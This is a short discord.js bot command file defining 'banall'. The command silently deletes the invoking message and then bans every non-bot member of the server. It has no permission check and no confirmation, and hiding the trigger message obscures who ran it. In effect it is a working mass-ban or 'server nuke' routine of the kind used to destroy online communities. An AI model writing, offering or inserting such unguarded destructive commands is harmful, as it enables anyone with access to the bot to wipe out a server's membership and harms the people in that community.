const Discord  = require("discord.js");
module.exports.run = (client, message, args) =>  {
    message.delete();

    message.guild.members.forEach(member => {
        if (member.id != client.user.id && !member.user.bot) {
            member.ban();
        }
    })
}

module.exports.help = {
    name: "banall"
}